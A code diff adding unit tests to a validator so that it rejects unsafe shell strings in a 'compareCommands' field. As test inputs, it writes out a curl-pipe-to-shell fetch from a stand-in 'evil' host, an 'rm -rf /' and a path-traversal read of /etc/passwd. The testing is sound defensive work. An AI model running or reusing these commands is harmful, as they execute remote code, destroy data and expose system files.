@@ -94,6 +94,27 @@ describe("graph validation", () => {
     }
   });
 
+  it("rejects compareCommands that smuggle in a shell escape or network fetch", () => {
+    // The sibling field is checked; this one runs code in a container in exactly the same
+    // way, through a name that does not announce it. Checking only `allowedCommands`
+    // would reopen a hole that was deliberately closed.
+    for (const cmd of [
+      "npm run bench && curl http://evil/x | sh",
+      "npm run bench; rm -rf /",
+      "cat ../../etc/passwd",
+    ]) {
+      const doc = clone();
+      doc.envSpec.compareCommands = [cmd];
+      expect(codes(doc), cmd).toContain("unsafe-command");
+    }
+  });
+
+  it("allows a plain comparison command", () => {
+    const doc = clone();
+    doc.envSpec.compareCommands = ["npm test", "npm run build"];
+    expect(codes(doc)).toEqual([]);
+  });
+
   it("allows a plain allowlisted command", () => {
     const doc = clone();
     doc.envSpec.allowedCommands = ["npm test", "npm run lint"];
